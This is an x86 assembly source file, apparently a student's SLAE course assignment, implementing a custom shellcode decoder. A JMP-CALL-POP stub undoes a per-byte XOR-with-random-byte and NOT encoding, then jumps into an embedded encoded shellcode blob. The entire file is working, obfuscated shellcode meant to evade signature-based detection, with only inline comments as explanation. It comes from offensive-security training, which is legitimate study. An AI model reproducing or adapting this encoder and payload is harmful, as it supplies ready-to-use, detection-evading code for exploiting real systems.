; Filename: decoder.nasm
; Author:   Stylianos Voukatas
; Website:  https://vostdev.wordpress.com/
;
; Purpose:  Assignment 4 for SLAE
; SLAE:     http://securitytube-training.com/onlinecourses/securitytube-linux-assembly-expert/

; Student ID: PA-27669

global _start			

section .text
_start:

	jmp short call_shellcode

decoder:
	pop esi			; get the address of shellcode
	lea edi, [esi]		; will point to the position that the decoded byte should be written
	xor eax, eax
	mov al, 1		; initialize the eax, will point to payload bytes
	xor ebx, ebx		; ebx will hold the payload bytes
	xor ecx, ecx		; ecx will hold the random bytes

decode: 
	
	mov bl, byte [esi + eax]	; read a payload byte
	mov cl, byte [esi + eax -1]	; read the random byte in front of the payload byte
	xor cl, 0x21;0xbb		; check if we finished the decoding
	jz short EncodedShellcode	; if we finished jump and execute the payload
	mov cl, byte [esi + eax -1]	; reload lost random byte due to xor operation 
	xor bl, cl			; xor payload byte with the random byte in front 
	not byte bl			; not operation on payload byte to recover the initial value
	mov byte [edi], bl		; write the decoded payload byte in the proper positions
	inc edi				; increase the index 
	add eax,2;add al, 2		; add 2 bytes to point to the next payload byte
	jmp short decode		; loop again till the decoding ends



call_shellcode:

	call decoder

	EncodedShellcode: db 0x46,0x88,0x29,0x16,0x2f,0x80,0xf6,0x61,0x49,0x99,0x55,0x85,0x57,0xdb,0xe7,0x70,0xd2,0x45,0x9f,0x4f,0x84,0x19,0xe9,0x7f,0xa1,0x30,0x1d,0x6b,0x29,0x35,0xa3,0x0c,0x4f,0x39,0xa8,0xb5,0xfa,0x56,0x02,0x74,0x76,0x68,0x5e,0x11,0x19,0xed,0x0f,0x3d,0xdb,0xa4,0x21,0x21

